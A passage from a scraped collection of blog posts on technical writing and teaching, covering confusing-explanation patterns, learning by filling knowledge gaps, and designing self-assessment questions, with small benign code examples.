support. […] In many VCS tools, this is a somewhat expensive\nprocess, often requiring you to create a new copy of your source code\ndirectory, which can take a long time for large projects. \n \n\n The outdated assumption here is that you (the reader) know how other version\ncontrol systems implement branching, and that comparing other tools’\nimplementation of branching to Git’s implementation will help you understand\nbranching. \n\n But if you’re reading this and you’ve never used another version control system\nand never plan to, this explanation is useless! Who cares about how other\nversion control systems implement branching? You just want to understand how\nGit works! \n\n The reason this explanation is written this way is probably that the first\nedition of the book was published in 2009, and this assumption was probably true\nin 2009! Many people learning Git shortly after it was released were switching from\nSubversion or CVS or something and found comparisons like this helpful. \n\n But in 2021 Git has been the dominant version control system for a long time,\nand most people learning Git for the first time won’t have  any  experience\nwith version control other than Git. \n\n I also sometimes see this “outdated assumptions about the audience’s knowledge”\nproblem with newer writing. It generally happens when the writer learned the\nconcept many years ago, but doesn’t have a lot of experience explaining it in\nthe present. So they give the type of explanation that assumes that the reader\nknows approximately the same things they and their friends knew in 2005 and\ndon’t realize that most people learning it today have a different set of\nknowledge. \n\n instead: test your explanations! \n\n Usually if I learned a concept a long time ago, it means that I’ve lost touch\nwith what it’s like to learn it for the first time today. So running an\nexplanation by a few people who  don’t already know the concept  helps to\ncatch incorrect assumptions I’ve made. \n\n (I bolded “don’t already know the concept” because it’s tempting to ask someone\nwho already understands the concept for a review. But they might have the exact\nsame blind spots as you!) \n\n pattern 2: having inconsistent expectations of the reader’s knowledge \n\n For example, a new language tutorial might explain a concept that almost all\nprogrammers would know, like how a for loop is used for iteration, while the\nwriting that immediately follows implicitly assumes knowledge that many people\ndon’t have, like how the stack works, how malloc works, etc. (thanks to Dan\nLuu for this example!) \n\n The problem with this is that are probably zero people who understand malloc but\ndon’t understand how a for loop works! And even though it sounds silly, it’s\neasy to accidentally write like this if you don’t have a clear idea of who\nyou’re writing for. \n\n instead: pick 1 specific person and write for them! \n\n You can pick a friend, a coworker, or just a past version of yourself. Writing\nfor just 1 person might feel insufficiently general (“what about all the other\npeople??“) but writing that’s easy to understand for 1 person (other than you!)\nhas a good chance of being easy to understand for many other people as well. \n\n pattern 3: strained analogies \n\n Sometimes when trying to explain a complex technical concept, an author will\nstart with a real-world concept that the reader definitely understands and use\na very involved analogy to compare them. \n\n Here’s an example I made up: \n\n \n Imagine our event system is like the Mississippi River. It travels through\nmany different ecosystems, and some rain particles don’t make it all the way.\nSometimes it flows at different speeds depending on environmental conditions.\nThe Mississippi River ends in many different tributaries. \n\n Many different kinds of fish live in the event system. Different fish have\ndifferent destinations.  Humans decide to live along the river and use it for\ndifferent purposes. They construct dams to control the flow. \n \n\n This example is a parody, but I always find this type of analogy confusing\nbecause I end up wasting a lot of time trying to analyze exactly how an\nevent stream is different / the same as the Mississippi river instead of just\nlearning technical facts about event streams: \n\n I think authors do this because.. it’s kind of fun to write these Big Weird\nAnalogies! Like, is there something in a stream processing system that’s like a\ndam? Maybe! It’s kind of fun to think about! But even though these can be fun\nto write, they’re not as fun to read – it’s a struggle to extract the actual\ntechnical facts you want to know. \n\n instead: keep analogies to a single idea \n\n Instead of using “big” analogies where I explain in depth exactly how an event\nprocessing system is like a river, I prefer to explain the analogy in one or\ntwo sentences to make a specific point and then leave the analogy behind. \n\n Here are 2 ways to do that. \n\n option 1: use “implicit” metaphors \n\n For example, if we’re talking about streams, I might write: \n\n \nEvery event in a stream flows from a producer to a consumer.\n \n\n Here I’m using the word “flow”, which is definitely a water metaphor. I think\nthis is great – it’s an efficient way to evoke an idea of directionality and\nthe idea that there are potentially a large number of events. \n\n I put together a bunch more metaphors in this style in  Metaphors in man pages . \n\n option 2: use a very limited analogy \n\n For example, here’s a nice explanation from  When costs are nonlinear, keep it small  by Jessica Kerr\nthat explains batching using an analogy to doing your laundry in a batch. \n\n \nWe like batching. Batching is more efficient: doing ten at once is faster than\ndoing one, one, two, one, one, etc. I don't wash my socks as soon as I take\nthem off, because lumping them in with the next load is free.\n \n\n This analogy is very clear! I think it works well because batching in laundry\nworks for the same reasons as batching in computing – batching your laundry\nworks because there’s a low incremental cost to adding another pair of socks to\nthe load. And it’s only used to illustrate one idea – that batching is a good\nchoice when there’s a low incremental cost for adding a new item. \n\n pattern 4: fun illustrations on dry explanations \n\n Sometimes I see authors put fun illustrations with a very dry explanation to\nmake the explanation seem more appealing and approachable. \n\n The goal isn’t generally to trick the reader into expecting a more friendly\nexplanation – I think the logic is usually more like “people like fun\nillustrations! let’s add some!“. But no matter what the intent, the problem is\nthat the reader can end up feeling misled. \n\n instead: make the design reflect the style of the explanation \n\n There are lots of great examples of illustrated explanations where the writing\nis in a clear and friendly style: \n\n \n how dns works \n why’s (poignant) guide to ruby \n how do calculators even \n \n\n On the other hand, dry explanations are useful too! Nobody expects the\n Intel instruction-set reference \nto be light reading! The writing is dry and technical, and the design is very\nutilitarian, which matches the style of the writing. \n\n pattern 5: unrealistic examples \n\n Here’s an unrealistic example of how to use  lambda  in Python: \n\n \nnumbers = [1, 2, 3, 4]\nsquares = map(lambda x: x * x, numbers)\n \n\n This example is unrealistic because most people don’t use  map  in Python – you’d use list comprehensions to do this instead. \n\n Here’s another unrealistic example: an interface example from  the Oracle docs on interfaces . \n\n \ninterface Bicycle {\n    //  wheel revolutions per minute\n    void changeCadence(int newValue);\n    void changeGear(int newValue);\n    void speedUp(int increment);\n    void applyBrakes(int decrement);\n}\n \n\n This kind of “real world example” is super common in object oriented\nprogramming explanations but I find it quite confusing – I’ve never\nimplemented a bicycle or car in my code! It doesn’t tell me anything about what\ninterfaces are useful for! \n\n instead: write realistic examples! \n\n Here’s a more realistic example of Python lambdas, which sorts a list of children by their age. (from my post  Write good examples by starting with real code )\nThis is how I use Python lambdas the most in practice. \n\n \nchildren = [\n    {\"name\": \"ashwin\", \"age\": 12},\n    {\"name\": \"radhika\", \"age\": 3},\n]\nsorted_children = sorted(children, key=lambda x: x['age'])\n \n\n Here’s a more realistic example of Java interfaces. \n\n  \n \nThe  Comparable  interface (from  the JDK source )\njust has one method -- here's its full implementation.\n \n\n \npublic interface Comparable<T> {\n    int compareTo(T o);\n}\n \n\n \nTo implement this interface, you just need to implement the\n compareTo  method. And if you write a class that implements this\ninterface (like a  Money  class for example), then you get all sorts\nof useful things for free! You can sort an array of  Money  objects with\n Arrays.sort ! You can put them in a  SortedSet !\n \n \n\n In this Java example, of course it’s not enough to explain built-in Java\ninterfaces – you also need realistic examples of how to create and use your own\ninterfaces. But this post isn’t about Java interfaces so let’s move on. \n\n pattern 6: jargon that doesn’t mean anything \n\n Let’s talk about this sentence from this  chapter on commit signing : \n\n \n Git is cryptographically secure, but it’s not foolproof. \n \n\n “Cryptographically secure” is unclear here because it  sounds \nlike it should have a specific technical meaning, but it’s not explained\nanywhere what’s actualy meant. Is it saying that Git uses SHA-1 to hash\ncommits and it’s difficult to generate SHA-1 hash collisions? I don’t know! \n\n Using jargon in a meaningless way like this is confusing because it can trick\nthe reader into thinking something specific is being said, when the information\nthey need is not actually there. (the chapter doesn’t explain anywhere what’s\nmeant by “cryptographically secure” in this context) \n\n instead: Avoid jargon where it’s not needed \n\n A lot of the time I find I can communicate what I need to without using any\njargon at all!  For example, I’d explain why commit signing is important like\nthis: \n\n \n\nWhen making a Git commit, you can set any name and email you want! For example, I can make a commit right now saying I'm Linus Torvalds like this:\n\n \ngit commit -m\"Very Serious Kernel Update\" \\\n --author='Linus Torvalds <torvalds@linux-foundation.org>'\n  \n\n \n\n pattern 7: missing key information \n\n Sometimes explanations of a concept are missing the most important idea to\nunderstand the concept. For example, take this explanation from  this chapter\non the Git object model  (which by the way has a nice concrete example of how to explore Git’s object model): \n\n \n Git is a  content-addressable filesystem . Great. What does that mean? It means\nthat at the core of Git is a simple key-value data store. What this means is\nthat you can insert any kind of content into a Git repository, for which Git\nwill hand you back a unique key you can use later to retrieve that content. \n \n\n This paragraph is missing what to me is the main idea of content-addressable\nstorage – that the key for a piece of content is a deterministic function of\nthe content, usually a hash (though the page does later say that Git uses a\nSHA-1 hash). It’s important that the key is a function of the content and not\njust any random unique key because the idea is that the content is addressed by\n itself  – if the content changes, then its key also has to change. \n\n This pattern is hard to recognize as a reader because – how are you supposed\nto recognize that there’s a key idea missing when you don’t know what the key\nideas  are ? So this is a case where a reviewer who understands the subject\nwell can be really helpful. \n\n pattern 8: introducing too many concepts at a time \n\n Here’s an explanation of linkers from  this page  that I find confusing: \n\n \n During the link process, the linker will pick up all the object modules\nspecified on the command line, add some system-specific startup code in front\nand try to resolve all external references in the object module with external\ndefinitions in other object files (object files can be specified directly on\nthe command line or may implicitly be added through libraries). It will then\nassign load addresses for the object files, that is, it specifies where the\ncode and data will end up in the address space of the finished program. Once\nit’s got the load addresses, it can replace all the symbolic addresses in the\nobject code with “real”, numerical addresses in the target’s address space. The\nprogram is ready to be executed now. \n \n\n Here are the concepts in this paragraph: \n\n \n object modules ( .o  files) \n external references \n symbolic addresses \n load addresses \n system-specific startup code \n \n\n It’s too much! \n\n instead: give each concept some space to breathe \n\n For example, I might explain “external references” like this: \n\n \n\n \nif you run  objdump -d myfile.o  on an object file you can see\nthat the  call  function calls are missing a target address, so that's why the\nlinker needs to fill that in. \n \n\n \n  33:   e8 00 00 00 00          call   38  \n           ^^^^^^^^^^^\n             this address is all 0s -- it needs to be filled in by the linker!\n             with the actual function that's going to be called!\n  38:   84 c0                   test   %al,%al\n  3a:   74 3b                   je     77  \n  3c:   48 83 7d f8 00          cmpq   $0x0,-0x8(%rbp)\n   \n   \n\n There’s still a lot of missing information here (how does the linker know what\naddress to fill in?), but it’s a clear starting point and gives you questions\nto ask. \n\n pattern 9: starting out abstract \n\n Imagine I try to explain to you what a Unix signal using the  definition from Wikipedia . \n\n \n Signals are a limited form of inter-process communication (IPC), typically\nused in Unix, Unix-like, and other POSIX-compliant operating systems. A signal\nis an asynchronous notification sent to a process or to a specific thread\nwithin the same process to notify it of an event. Signals originated in 1970s\nBell Labs Unix and were later specified in the POSIX standard. \n \n\n By itself, this probably isn’t going to help you understand signals if you’ve\nnever heard of them before! It’s very abstract and jargon-heavy (“asynchronous\nnotification”, “inter-process communication”) and doesn’t have any information\nabout what Unix signals are used for in practice. \n\n Of course, the Wikipedia explanation isn’t “bad” exactly – it’s probably\nwritten like that because teaching people about signals for the first time isn’t really the\ngoal of the Wikipedia article on signals. \n\n instead: start out concrete \n\n For example, I wrote this page explaining signals a few years ago. \n\n \n\n I start out by relating signals to the reader’s experience (“have you used\n kill ? you’ve used signals!“) before explaining how they work. \n\n pattern 10: unsupported statements \n\n Here’s an explanation of C header files, from  this page . \n\n \n In modern C,  header files are crucial tools  that must be designed and used\ncorrectly. They allow the compiler to cross-check independently compiled parts\nof a program. \n\n Headers declare types, functions, macros etc that are needed by the consumers\nof a set of facilities. All the code that uses any of those facilities includes\nthe header. All the code that defines those facilities includes the header.\nThis allows the compiler to check that the uses and definitions match. \n \n\n This says “In modern C, header files are crucial tools…” (which is true), but\nit doesn’t explain  why  header files are crucial. This of course wouldn’t be\na problem if the audience already understood why header files in C are\nimportant (it’s a very fundamental concept!). But the whole point here is to explain\nheader files, so it needs to be explained. \n\n instead: Prove that your statements are true! \n\n For example, I might write: \n\n \n\n \nAlmost every C program includes header files. For example, if you've ever\nwritten  #include <stdio.h>  at the beginning of a C program,  stdio.h  is a\nheader file.  #include  basically tells the C preprocessor to paste\nthe contents of  stdio.h  at the beginning of the program.\n \n\n \nOne reason header files are important is that  they define types and\nconstants you need in your programs .  For example, this code by itself\nwill fail to compile with the error  error: unknown type name\n'FILE' , because the  FILE  type is undefined.\n \n\n \nint main() {\n    FILE *fp;\n    fp  = fopen(\"data.txt\", \"w\");\n}\n \n \n FILE  is defined in  stdio.h  and if you add a\n #include <stdio.h> , at the top, then the program will\ncompile.\n \n\n \n\n This example program lets the reader actually run that program themselves and\nverify that it doesn’t compile if they want – they don’t have to take my word\nfor it! \n\n pattern 11: no examples \n\n Another problem with the previous explanation of header files is – there\naren’t any examples! Leaving out examples makes it harder for the reader to\nrelate the new terminology to their own experiences. \n\n Almost anyone who’s ever written a C program has definitely used header files,\nso a simple example (like mentioning  stdio.h ) can really help. \n\n In that header files example, I replaced \n\n \n In modern C, header files are crucial tools… \n \n\n with an explanation that includes a simple example: \n\n \nAlmost every C program includes header files -- if you've ever seen something\nlike  #include   at the beginning of a C program,  stdio.h  is a\nheader file.\n \n\n pattern 12: explaining the “wrong” way to do something without saying it’s wrong \n\n Here’s a pattern I see sometimes in tutorials (though unfortunately I don’t have an example): \n\n \n Explain the “wrong” way of doing something without saying up front that it’s wrong \n Later on, show the consequences of doing the “wrong” thing \n Explain the “right” way \n \n\n I think the intention of this is to imitate the real-life experience of making\nmistakes. Usually when you make a mistake, you don’t know that it’s wrong at\nthe time! \n\n But often the reader will end up feeling misled or confused about which way is\nactually “correct”. And it’s possible that they would never even have made that\nparticular mistake on their own! \n\n instead: here are four options for presenting mistakes \n\n Here are a few ways of accomplishing the same thing without misleading the\nreader: \n\n \n Frame the “wrong” thing as an experiment (“what if we try doing it X way?”) \n State an incorrect belief the reader might have: (“You might think that the\ncommand line tool would need to run as root (because it’s talking to the\nkernel, but…“) \n Explain a common mistake (for example “Avoid Striding and Slicing in a Single Expression” in  Effective Python ) \n Tell a story about a mistake you made and why it caused problems (here’s one of mine:  Why Ruby’s Timeout is dangerous (and Thread.raise is terrifying) ) \n \n\n Talking about mistakes is very important, just say up front that the thing is a\nmistake! \n\n pattern 13: “what” without “why” \n\n I very often see people introduce new technologies with  a list of features \ninstead of  explaining why people choose the technology . \n\n For example, the  kubernetes homepage  lists a bunch of\nKubernetes’ features: automated rollouts and rollbacks, service discovery and\nload balancing, storage orchestration, secret and configuration management,\nautomatic bin packing, etc. This kind of feature list is pretty common on a\nproject homepage, but by itself it doesn’t help someone understand whether\nKubernetes is right for them. \n\n I think one reason writers leave out the “why” is that it’s hard to write\na simple universal answer to “why do people use Kubernetes?”. There are a lot of reasons!\nAnd if you get the “why” wrong, it’s very noticeable and it feels embarrassing.\nSo it feels safer to just list some features and move on. \n\n But as a reader, I find that  a weak “why” is much better than no “why” . I’d\nrather read “well, we use Kubernetes because it provides a decent basic\ndeployment system and GKE means we don’t have to think about servers” than an\nattempt at covering every single company’s business reasons for using Kubernetes. \n\n instead: talk about your reasons for using the technology \n\n Of course, if you have a clear universal explanation of the problems a\ntechnology solves, that’s great. But I think a lot of the time authors\n(including me!!) just don’t have a great grasp of why other people are choosing\na given technology. That’s okay! \n\n If you don’t feel you can give a universal “why”, I think it’s better to just\nbe open about that and give an example from your personal experience. \n\n For example, I might say about Kubernetes: \n\n \nThe only problem I've solved with Kubernetes was: we had a distributed cron job\nsystem (Chronos) that wasn't working reliably (cron jobs would sometimes just not run), and we  replaced the system with\nKubernetes . Kubernetes' distributed cron was a lot more reliable.\n \n\n This isn’t a good explanation of why people in general use Kubernetes! But\nI find reading many specific personal stories like this WAY more helpful than\nan attempt at cramming “here’s what’s Kubernetes is for” into a few paragraphs. \n\n I want to be clear here that even just explaining your own personal experience\nisn’t that easy. Technology projects can be messy, and sometimes their goals\nchange in the middle. I started out\ntrying to give an example of why I’ve used  Envoy \nand I realized I would need to think about it for several hours and have a few\nconversations with old coworkers to explain it coherently so I decided to use a\ndifferent example. \n\n that’s all for now! \n\n Originally I thought it would be simple to put together these patterns (“there\nare so many confusing explanations!“) but it was surprisingly hard to\narticulate exactly what was confusing to me about each explanation in a\nconvincing way. \n\n It’s definitely incomplete, but I’ve already spent two weeks and 3000 words on\nit so I’ll stop here and I’d love to hear what I’ve missed :) \n\n  thanks to Laura, Dan, Kamal, Alyssa, Lindsey, Paul, Ivan, Edith, Hazem,\nAnton, and John for helping improve this post  \n\n \n\n \n.julia {\n    border-left: 6px solid green;\n}\n\narticle blockquote {\n    border-left: 6px solid #e22;\n}\n\nblockquote code {\n    display: inline-block;\n    white-space: no-wrap;\n    background-color: #f7f7f7;\n    font-size: 0.8em;\n    line-height: 1.5em;\n    border: 1px solid #cccccc;\n    padding: 0 2px;\n    margin: -1px 0px;\n}\n \n\n translations \n\n here is a translation: \n\n \n Korean \n \n\n"},
{"url": "https://jvns.ca/blog/2021/09/20/teaching-by-filling-in-knowledge-gaps/", "title": "Teaching by filling in knowledge gaps", "content": "\n     \n\n Hello! This post (like  patterns in confusing explanations )\nis another one in the “julia attempts to articulate her teaching strategy”\nseries. \n\n I’ll start out by talking about a “backwards” approach to learning\nthat I think a lot of you will recognize (do projects first without fully\nunderstanding what you’re doing, fill in missing knowledge after), and then\ntalk about I try to teach in a way that works better with that mode of\nlearning. \n\n how I’ve learned programming: backwards \n\n There are a lot of “basic” concepts in programming, like memory management,\nnetworking, operating systems, assembly, etc. You could imagine that you learn\nprogramming by first starting with the basic concepts and then learning\nabstractions on top of those concepts. \n\n But, even though I have a very traditional CS background, that’s not how it’s\nusually worked for me. Instead, here’s a real example from how I learned about\nwebsites: \n\n \n Set up a website (for example using Apache) \n Three years later, realize “wait, I have no idea how that worked at all” \n Learn the basics of HTTP \n \n\n Of course, to really understand how websites work, you do need to understand\nthe basics of HTTP. But at the same time, you can make lots of great websites\nwithout knowing anything about HTTP except that 404 means “not found”. \n\n it’s fun to build a lot of cool stuff quickly \n\n Obviously I don’t actually think it’s bad to make websites without knowing\nHTTP. It’s fun! You can make a website and set up nginx or Apache by copying\nsome stuff you found on Stack Overflow and didn’t fully understand, and then\nyou have a website on the internet! I find it very fun to start out with a\ntechnology by quickly building a bunch of stuff with it without understanding\nexactly how it works (like making this  shader ). \n\n it’s fun to fill in the information you’ve missed \n\n Now that you have your website, here’s a way you could imagine learning about\nHTTP headers: \n\n \n Your website suddenly gets really popular, so you put it behind a CDN to save money \n But some of your pages are dynamic and you don’t want to cache them \n So then you need to learn about browser caching and the  Cache-Control  HTTP header \n And maybe then you learn about headers in general and find some other headers you want to set \n \n\n I think that learning about HTTP headers  after  you already have a website\nis way more fun and a lot easier than learning about them  before  you have a\nwebsite. \n\n It’s much more obvious why you might want to use them, and you’re a lot more\nlikely to remember the information later. \n\n learning abstractions first results in knowledge gaps \n\n Let’s say you start learning to make websites by learning Ruby on Rails.\nRails abstracts away a lot of things, like SQL (through its ORM), sockets, and HTTP. \n\n So if you learn Rails, you’re not likely to “naturally” pick up HTTP or\nsockets or SQL the same way you would if you were writing a webserver from\nscratch. \n\n jobs today have more abstractions than they used to \n\n I asked  on twitter  what\npeople feel was easier to learn 15 years ago. One example a lot of people\nmentioned was the command line. \n\n I was initially a bit surprised by this, but when I thought about it makes\nsense – if you were a web developer 15 years ago, it’s more likely that you’d\nbe asked to set up a Linux server.  That means installing packages, editing\nconfig files, and all kinds of things that would get you fluent at the command\nline.  But today a lot of that is abstracted away and not as big a part of\npeople’s jobs. For example if your site is running on Heroku, you barely have\nto know that there’s a server there at all. \n\n I think this applies to a lot more things than the command line – networking\nis more abstracted away than it used to be too! In a lot of web frameworks,\nyou just set up some routes and functions to handle those routes, and you’re\ndone! \n\n Abstractions are great, but they’re also leaky, and to do great work you\nsometimes need to learn about what lives underneath the abstraction. \n\n how can we help people understand what’s underneath the abstractions? \n\n Here some of you might be tempted to go on a rant about how “kids these days”\ndon’t understand databases or networking or the command line or whatever thing\nhas most annoyed you. \n\n But that’s boring, we’ve had that argument a billion times, and it’s\nineffective – people are going to keep learning abstractions first! It’s fun\nto learn abstractions first! You can get a lot of work done without\nunderstanding sockets! \n\n But obviously I do think it’s important to fill in some of those knowledge\ngaps when it’s relevant to your job – that’s what this whole blog is about! \n\n So let’s talk about how we can help people fill in some of their knowledge gaps\n(when they want/need to!), but by actually providing useful information instead\nof ranting about what “kids these days” should know :) \n\n my steps for explaining something \n\n I don’t actually have explicit steps I use when teaching, but I spent some\ntime thinking about my approach and here’s what I think I do. \n\n Instead of starting “at the beginning” when explaining a topic, what I usually\ndo when writing a blog post or comic is: \n\n \n notice a useful idea that I think is on the edge of a lot of people’s knowledge \n make a bunch of assumptions about what I think that group of people\ngenerally know (usually based on what I know and what I think my\nfriends/coworkers know) \n explain the idea using those assumptions \n \n\n Here are a few more guidelines that I use when teaching “backwards”. \n\n \n use people’s existing knowledge when teaching \n explain just one concept at a time \n use bugs to peel back abstractions \n \n\n Let’s talk more about each of those! \n\n use people’s existing knowledge when teaching \n\n One mistake I see people make a lot when they notice someone has a knowledge gap is: \n\n \n notice that someone is missing a fundamental concept X (like knowing how binary works or something) \n assume “wow, you don’t know how binary works, you must not know ANYTHING” \n give an explanation that assumes the person basically doesn’t know how to\nprogram at all \n waste a bunch of their time explaining things they already know \n \n\n But this is a huge missed opportunity when explaining a concept to a\nprofessional programmer – they already know a lot! Any professional\nprogrammer definitely knows a lot of things that are very related to how\nbinary works. \n\n explain just one concept at a time \n\n Because I don’t have a lot of information about who I’m writing for, I try to: \n\n \n only address one major gap at a time \n make it super clear what the gap I’m addressing is \n \n\n Then people can easily tell if what I’m writing is relevant to them, get the\ninformation they’re interested in, and leave. \n\n It might seem like this wouldn’t work because everyone has a totally unique set\nof knowledge, but actually there are a lot of interesting facts that happen to\nbe on the edge of a LOT of people’s knowledge. So it’s all about identifying\npatterns (“hmm, I didn’t realize X for a long time, I bet other people didn’t\neither”). \n\n bugs are an amazing way to learn what’s under an abstraction \n\n My favourite way to learn what’s underneath an abstraction is bugs! Bugs often\nbreak through abstraction boundaries, like  this performance issue that was caused by a TCP setting . \n\n So they’re a great excuse to learn what’s underneath, they show you exactly how\nthe underlying thing (like TCP) is connected to the abstraction (like an HTTP\nrequest). And they inherently help you learn one step at a time, because each\nbug will usually teach you about just one or two things. \n\n teaching by filling in knowledge gaps can be faster \n\n One thing I love about teaching this way is that if the reader is already using a\ntool, I can assume that they know a bunch of basic things about it and skip\nstraight to the interesting parts. \n\n For example, let’s look at this bash cheat sheet. \n\n \n\n This cheat sheet assumes that you know: \n\n \n what bash is \n that variables are referenced in bash with  $VAR \n what “stdout” means \n what it means to search and replace in a string \n what an array is \n \n\n And I’d guess that most people who are writing bash scripts know those things!\nBut I’d also guess that many people who write bash scripts  don’t  know that: \n\n \n /usr/bin/[  is a program (actually in bash  [  is a builtin, but it’s a builtin that behaves the same way as the program  /usr/bin/[ ) \n the curly brace in  a{.png.svg}  has a totally different meaning from the one in  { command1; command2 } \n you can search and replace in a string with  ${} \n \n\n example of teaching by filling in knowledge gaps: bite size bash \n\n Last year I wrote a zine called  bite size bash  about\nhow bash scripting works. (the above cheat sheet is part of it) \n\n You might think that I’d explain some basic things like “what bash is” and the\nusual syntax of a bash script. But I didn’t. That’s because I wrote the zine\nfor people  who were already using bash . \n\n Instead, I went through the most things bash script writers don’t understand\nabout bash (variable assignment, how if statements work, how to quote\nthings, etc) and explained how those things actually work in bash. \n\n filling in knowledge gaps at the drop-in tutoring center \n\n To me teaching and writing in this way feels very natural. But people have\ntold me they find it really difficult to write without explaining everything\nfrom the beginning. \n\n I think my teaching style might be informed in some way by my experience\nworking as a tutor as a drop-in math tutoring centre. I’ve had 5 or so part\ntime jobs (from age 15-20) doing math or physics tutoring where I basically had\nto talk to random students who were confused about something for 20 minutes. I\ncould probably only teach them only 1 or 2 things in those 20 minutes, and I\nmight only ever meet the person once. So I had to quickly figure out what they\nalready knew and what kind of information might help them. \n\n I learned to listen a lot and not jump to conclusions about what the person\ndidn’t know – often they already actually understood a lot about the math\nclass they were taking and I just needed to explain one or two small things. \n\n I think of writing on the internet as being kind of similar. I have no idea\nwho’s reading my writing or what they already know, and they’re probably going\nto only spend 10 minutes or so reading it. So I can only intervene in a really\nlimited way. \n\n I think unpeeling abstractions is what I’m trying to do in my writing \n\n I think “show people what lives underneath their abstractions” is a big part\nof what I’m trying to do with my writing. This might be why I’m so obsessed\nwith bugs – they’re such a natural way to learn about what’s hiding under\nyour abstractions in a way that’s actually relevant to your work. \n\n \nThanks to Miles, Jake, Dan, Matthew, and Kamal for reading a draft of this post.\n \n\n"},
{"url": "https://jvns.ca/blog/2020/06/14/questions-to-help-you-learn/", "title": "Questions to help people decide what to learn", "content": "\n     \n\n For the last few months, I’ve been working on and off on a way to help people\nevaluate their own learning & figure out what to learn next. \n\n This past week I built a new iteration of this:  https://questions.wizardzines.com , which today has 2\nsets of questions: \n\n \n questions about UDP \n questions about sockets \n \n\n It’s still a work in progress, but I’ve been working on this for quite a while\nso I wanted to write down how I got here. \n\n the goal: help people learn on their own \n\n First, let’s talk about my goal. I’m interested in helping people who are\ntrying to learn on their own. I don’t have any specific materials I’m trying to\nteach – I want to help people learn what  they  want to learn. \n\n I’ve done a lot of this by writing blog posts &\n zines , but I felt like I was missing something –\nwere people really learning what they wanted to learn? How could they tell if\nthey’d learned it? \n\n I felt like I wanted some kind of “quiz” or “test”, but I wasn’t sure what it\nshould look like. \n\n formative assessment vs summative assessment \n\n Let’s take a very quick detour into terminology. There are two kinds of\nassessment teachers use in school. \n\n formative assessment : “evaluations used to modify teaching and learning activities to improve student attainment.” \n\n summative assessment : used to determine grades \n\n Grades are pretty pointless if you’re teaching yourself (who cares if you got\nan A in sockets?). But formative assessments! If you could take some kind of\nevaluation to help you decide what exactly you should teach yourself next! That\nseems more useful. So I got interested in building some kind of “formative\nassessment” tool. \n\n (thanks to  Sumana  for reminding me of these terms!) \n\n next step: ask on Twitter how people feel about quizzes \n\n So I asked on Twitter (in  this thread ): \n\n \n have you ever taken a class (online or offline!) where you were given a quiz\nfirst that you could use to check your understanding of the topic at the start?\ndid it help you? \n \n\n I got about 90 replies. Here are some themes I took away from the replies: \n\n \n quizzes remind many people of bad school experiences \n people like using quizzes if they can direct their own learning (“skip X\nsection if I already know the thing”) \n one person said they took a quiz where they got a low score at the beginning\nand it helped them realize that they didn’t actually know the course content\nas well as they thought \n \n\n One thing I learned from this is that being told you  don’t  know something is\na bad experience for a lot of people. \n\n idea: build flashcards you can learn from \n\n My first idea was to reframe a test as a way to  learn . So instead of it\nbeing something that tells you what you  don’t  know (which, so what?), it\nhelps you learn something new! \n\n So I built a few sets of flashcards about various topics.\nHere’s the first set I built,  flashcards on containers , if you want to try it out. \n\n If you didn’t try it – it looks like this: \n\n \n \n \n\n Basically – there are 14ish questions, you click the card to see the answer,\nand for each card you categorize it as “I knew that!”, “I learned something”,\nor “that’s confusing” (which is meant to be a kind of “other” category, where\nyou didn’t know that and you didn’t learn anything). \n\n The idea is that the answers contain enough information that you could actually\nlearn a little bit from them, and hopefully be inspired to go learn more on\nyour own if you’re interested. \n\n good things about the flashcards \n\n some of the positive feedback I got about the flashcards was: \n\n \n it’s fun \n people liked being able to reflect on what they learned by the end \n they were fast to complete (maybe 3-5 minutes) \n \n\n problems with the flashcards \n\n But there were some problems that were bothering me, too. \n\n \n the word “flashcards” has a lot baggage I didn’t want – it’s strongly\nassociated with language learning / memorization. I don’t use flashcards\nat all myself so it didn’t really resonate with me. \n the format was constrained, and sometimes I wanted to include more\ninformation in the answer than there was space for \n the UI was a bit confusing, some people couldn’t figure out that you were\nsupposed to click on the card to flip it. \n \n\n people dislike questions that don’t match their mental model \n\n Probably the most important thing I learned from making these flashcards is\nthat it really matters how well the question matches the reader’s mental model. \n\n I started out by writing questions by taking statements I’d normally make about a\ntopic, and turning them into questions. Sometimes this really didn’t work. \n\n Here’s an example of it not working: I think the statement “a HTTP request has\n4 parts: a body, the headers, the request method, and the path being requested”\nis relatively unobjectionable. That how I think about what a HTTP request is. \n\n But what if I ask you “what are the 4 parts of a HTTP request?” and the answer\nis “a body, the headers, the request method, and the URL being requested”? It\nturns out, that’s totally different!! Not everyone thinks about HTTP requests\nas having 4 parts – they might think of it has having 3 parts (the first line,\nthe headers, and the body). Or 2 parts and 1 optional part (the first line, and\nthe headers, and maybe an optional body). Or some other way! So it’s weird to\nbe asked “what are the 4 parts of a HTTP request”. \n\n There were a lot of other examples like this, where people reacted badly to\nsome question I asked that didn’t match up with how they think about a topic.\nSo I learned that if I’m asking a question, it gets held to a higher standard\nfor how well it matches with the reader’s mental model than when making the\nsame statement. \n\n An example of what I think would be a better question here is “Does every HTTP\nrequest have headers?” (yes! the HTTP/1.1 RFC requires that the Host header be\nset!). But even that is maybe a little tricky – probably at least one HTTP/1.0\nclient implementation is out there in the world sending requests without\nheaders, even though 99.99% of HTTP requests have headers. \n\n Of course, it’s ok if the question/answer doesn’t match the reader’s mental\nmodel if their mental model is incorrect, but if their model is correct then I\nthink it should match. \n\n get rid of multiple choice \n\n The other thing I learned from these flashcards is that a lot of people dislike\nmultiple choice. I haven’t thought about this that much, but honestly I don’t\nreally like multiple choice either so I decided to get rid of it. \n\n next step: get reminded of The Little Schemer \n\n I don’t remember why, but I’ve had The Little Schemer kicking around in my head\nfor a while. I haven’t actually read the whole thing myself, but I kept hearing\npeople talking about it. Here’s the first page of The Little Schemer, if you\nhaven’t heard of it: \n\n \n\n This reminded me a lot of what I was trying to do – there are questions and\nanswers, but the goal isn’t for you to get all the questions “right”.  Instead,\nI think the goal is for you to think about whether you know the answer yet or\nnot and learn as you go. \n\n switch to a side-by-side format \n\n So, I kept a similar question/answer format, but switched to a side-by-side format, like the Little Schemer. \n\n \n\n What I like about putting the questions & answers next to each other: \n\n \n you can see both at the same time, so you don’t forget what the question was \n it then makes more sense to just put all the questions & answers on the same\npage, so you can easily go back and look at the previous question if you want \n \n\n Basically I like that it gives the reader more control, which I think is important. \n\n call it “questions” instead of “flashcards” \n\n I also renamed the project to “questions” because that’s really how I think\nabout learning for myself – I don’t do “flashcards”, but I do constantly ask\nmyself questions about topics I don’t understand, figure out the answers to\nthose questions, and then repeat until I understand the topic as well as I want\nto. \n\n But coming up with the right questions on your own is hard when you don’t a\nlot, so I’m hopeful that providing folks with a bunch of questions (and\nanswers) to think about will help you decide what you want to learn next. \n\n keep the “I learned something” button \n\n When I released the first set of questions on UDP, I didn’t include an 